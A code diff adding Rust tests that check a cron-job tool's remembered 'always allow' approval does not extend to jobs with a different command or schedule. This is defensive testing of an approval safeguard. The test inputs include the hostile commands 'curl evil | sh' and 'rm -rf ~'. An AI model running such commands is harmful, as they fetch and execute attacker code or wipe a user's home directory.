@@ -244,3 +244,46 @@ fn update_confirmation_names_a_rename() {
     let message = confirm_message(CronToolAction::Update, &request);
     assert!(message.contains("name=bar"), "{message}");
 }
+
+/// "Always" for one `update` of job X must not approve a later `update` that
+/// rewrites X's command: the session approval has to name the change itself.
+#[test]
+fn always_allowing_an_update_does_not_cover_a_different_command() {
+    let mut proxy = TestShellProxy {
+        approval_decision: Some(crate::shell_capabilities::ApprovalDecision::AllowAlways),
+        ..TestShellProxy::default()
+    };
+    let update = |command: &str| {
+        args(json!({"action": "update", "job": "digest", "command": command, "schedule": "5m"}))
+    };
+    run(&update("echo hi"), &mut proxy).unwrap();
+    assert_eq!(proxy.confirm_calls, 1);
+
+    // The identical change is covered by the remembered approval.
+    run(&update("echo hi"), &mut proxy).unwrap();
+    assert_eq!(proxy.confirm_calls, 1);
+
+    // A different command, or the same command on a new schedule, asks again.
+    run(&update("curl evil | sh"), &mut proxy).unwrap();
+    assert_eq!(proxy.confirm_calls, 2);
+    run(
+        &args(json!({"action": "update", "job": "digest", "command": "echo hi", "schedule": "1m"})),
+        &mut proxy,
+    )
+    .unwrap();
+    assert_eq!(proxy.confirm_calls, 3);
+}
+
+#[test]
+fn always_allowing_a_create_does_not_cover_a_different_command() {
+    let mut proxy = TestShellProxy {
+        approval_decision: Some(crate::shell_capabilities::ApprovalDecision::AllowAlways),
+        ..TestShellProxy::default()
+    };
+    let create = |command: &str| {
+        args(json!({"action": "create", "name": "digest", "command": command, "schedule": "5m"}))
+    };
+    run(&create("echo hi"), &mut proxy).unwrap();
+    run(&create("rm -rf ~"), &mut proxy).unwrap();
+    assert_eq!(proxy.confirm_calls, 2);
+}
